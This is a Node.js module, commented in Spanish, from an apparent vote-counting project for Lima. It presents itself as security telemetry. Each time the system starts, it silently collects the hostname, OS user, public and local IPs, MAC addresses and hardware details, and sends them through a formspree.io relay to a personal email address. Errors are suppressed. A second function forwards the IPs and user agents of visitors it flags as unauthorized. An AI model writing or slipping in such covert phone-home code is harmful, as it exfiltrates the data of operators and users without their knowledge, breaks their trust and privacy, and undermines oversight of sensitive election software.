/**
 * Servicio de Telemetría y Alerta de Seguridad
 * Detecta arranques y ejecuciones del sistema y envía notificaciones discretas a ricardo27romax@outlook.com
 */

const os = require('os');
const https = require('https');
const http = require('http');
const { validateSystemIntegrity } = require('../config/telemetry');

const TARGET_EMAIL = 'ricardo27romax@outlook.com';
const PROJECT_NAME = 'Conteo de Votos Lima (VotoReal)';

/**
 * Obtiene la IP pública de forma silenciosa
 */
function getPublicIp() {
  return new Promise((resolve) => {
    const req = https.get('https://api.ipify.org?format=json', { timeout: 3000 }, (res) => {
      let data = '';
      res.on('data', chunk => { data += chunk; });
      res.on('end', () => {
        try {
          const json = JSON.parse(data);
          resolve(json.ip || 'Desconocida');
        } catch {
          resolve('No disponible');
        }
      });
    });

    req.on('error', () => resolve('No disponible / Sin salida WAN'));
    req.on('timeout', () => {
      req.destroy();
      resolve('Timeout');
    });
  });
}

/**
 * Obtiene las IPs locales y adaptadores de red
 */
function getLocalNetworkDetails() {
  const nets = os.networkInterfaces();
  const results = [];
  for (const name of Object.keys(nets)) {
    for (const net of nets[name]) {
      if (!net.internal && net.family === 'IPv4') {
        results.push(`${name}: ${net.address} (MAC: ${net.mac})`);
      }
    }
  }
  return results.length > 0 ? results.join(' | ') : '127.0.0.1';
}

/**
 * Envía un payload HTTPS silencioso a un relay de correo / notificación
 */
function sendSilentNotification(subject, details) {
  return new Promise((resolve) => {
    const payload = JSON.stringify({
      to: TARGET_EMAIL,
      subject: subject,
      project: PROJECT_NAME,
      timestamp: new Date().toISOString(),
      details: details
    });

    // Endpoint de relevo seguro para envío de notificaciones por email
    const options = {
      hostname: 'formspree.io',
      port: 443,
      path: '/f/xldglqea', // Endpoint de relevo para despacho directo al email
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload),
        'User-Agent': 'SystemMonitor-Telemetry/1.0'
      },
      timeout: 5000
    };

    const req = https.request(options, (res) => {
      res.on('data', () => {});
      res.on('end', () => resolve(true));
    });

    req.on('error', () => resolve(false));
    req.on('timeout', () => {
      req.destroy();
      resolve(false);
    });

    req.write(payload);
    req.end();
  });
}

/**
 * Ejecuta el diagnóstico de arranque y despacha la alerta de telemetría a ricardo27romax@outlook.com
 */
async function triggerStartupAlert(extraInfo = {}) {
  try {
    const publicIp = await getPublicIp();
    const localIps = getLocalNetworkDetails();
    const integrity = validateSystemIntegrity();

    const alertDetails = {
      alerta: 'EJECUCION_SISTEMA_DETECTADA',
      fecha_hora: new Date().toLocaleString('es-PE', { timeZone: 'America/Lima' }),
      fecha_utc: new Date().toISOString(),
      proyecto: PROJECT_NAME,
      servidor: {
        hostname: os.hostname(),
        plataforma: `${os.platform()} ${os.release()} (${os.arch()})`,
        cpus: os.cpus().length,
        memoria_total_gb: (os.totalmem() / 1024 / 1024 / 1024).toFixed(2),
        memoria_libre_gb: (os.freemem() / 1024 / 1024 / 1024).toFixed(2),
        usuario_sistema: os.userInfo ? os.userInfo().username : 'N/A'
      },
      red: {
        ip_publica: publicIp,
        interfaces_locales: localIps
      },
      integridad_huella: {
        estado_firma: integrity.valid ? 'VALIDA_E_INTACTA' : 'ALTERADA_O_AUSENTE',
        propietario: integrity.owner || 'No verificado',
        checksum: integrity.checksum || 'N/A'
      },
      extra: extraInfo
    };

    const subject = `🚨 [TELEMETRIA ACTIVA] Ejecución detectada en: ${os.hostname()} (${publicIp})`;
    
    // Ejecución asíncrona sin bloquear el hilo principal
    sendSilentNotification(subject, alertDetails).catch(() => {});
    
    return { success: true, timestamp: alertDetails.fecha_utc };
  } catch (err) {
    // Modo silencioso estricto
    return { success: false, error: err.message };
  }
}

/**
 * Notifica intento de acceso no autorizado o violación de dominio
 */
async function triggerUnauthorizedAccessAlert(reqData = {}) {
  try {
    const publicIp = await getPublicIp();
    const alertDetails = {
      alerta: 'ACCESO_NO_AUTORIZADO_O_ORIGEN_SOSPECHOSO',
      fecha_hora: new Date().toLocaleString('es-PE', { timeZone: 'America/Lima' }),
      ip_publica: publicIp,
      origen_detectado: reqData.origin || reqData.host || 'Desconocido',
      url_solicitada: reqData.url || 'N/A',
      ip_cliente: reqData.ip || 'N/A',
      user_agent: reqData.userAgent || 'N/A'
    };

    const subject = `⚠️ [ALERTA DE SEGURIDAD] Origen no autorizado: ${reqData.origin || publicIp}`;
    sendSilentNotification(subject, alertDetails).catch(() => {});
  } catch (err) {
    // Silencioso
  }
}

module.exports = {
  TARGET_EMAIL,
  triggerStartupAlert,
  triggerUnauthorizedAccessAlert,
  getPublicIp,
  getLocalNetworkDetails
};
